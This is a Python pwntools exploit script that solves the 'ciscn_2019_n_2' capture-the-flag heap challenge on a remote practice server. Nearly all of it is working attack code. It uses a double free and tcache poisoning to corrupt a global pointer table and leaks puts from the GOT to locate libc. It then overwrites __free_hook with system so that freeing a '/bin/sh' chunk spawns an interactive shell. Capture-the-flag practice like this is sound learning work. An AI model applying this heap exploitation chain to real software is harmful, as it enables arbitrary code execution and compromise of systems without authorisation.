# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './ciscn_2019_n_2'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29492'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(name , age):
    cmd(1)
    sa('name:' , name)
    sla('age:' , age)

def edit(idx, name , age):
    cmd(3)
    sla('Index:' , idx)
    sa('name:' , name)
    sla('age:' , age)

def delete(idx ):
    cmd(2)
    sla('Index:' , idx)

def show(idx ):
    cmd(4)
    sla('Index:' , idx)

def leak(idx, addr , size):
    cmd(6)
    sla('Index:' , idx)

def addMoney( idx ):
    cmd(6)
    sla('Index:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    puts_got = elf.got['puts']
    add('niyah' , 114514)
    delete(0)
    delete(0)

    add(p64(0x602060 - 0x10) , 11451419)
    add('a' , 'a')
    add('a' , 0x602060 + 0x10 )
    edit(0 , p64(0x602060) ,puts_got)

    show(2)
    puts_addr = l64()
    libc.address = puts_addr - libc.sym['puts']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']

    edit(0 , '/bin/sh\x00' , __free_hook)
    edit(2 , p64(system_addr) , 0)
    delete(0)

    # dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   ciscn_2019_n_2.py
@Time    :   2022/02/03 22:33:58
@Author  :   Niyah 
'''